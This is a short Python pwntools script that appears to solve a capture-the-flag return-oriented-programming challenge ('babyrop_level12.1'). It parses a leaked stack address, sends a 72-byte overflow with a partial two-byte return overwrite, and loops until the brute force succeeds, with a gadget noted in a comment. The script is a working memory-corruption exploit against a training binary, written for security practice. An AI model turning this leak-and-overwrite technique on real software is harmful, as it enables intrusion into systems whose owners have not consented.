
from pwn import *


while True:
        p = process('/challenge/babyrop_level12.1')
        #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #gdb.attach(p,'''break main''')
        #sleep(1)
        p.recvuntil(b'located at: ')
        s = p.recv()[:14]
        leak_stack = int(s.decode(),16)
        win = leak_stack-8
        print(hex(win))
        payload = b'a'*72+p64(win+0x70)+b'\x97\x96'
        p.send(payload)
        sleep(0.5)
        s = p.recv().decode()
        print(s)
        if 'pwn' in s:
                break
        else:
                continue

#0x0000000000025697 : mov rsi, qword ptr [rbp - 0x70] ; mov rdi, rbx ; call rsi
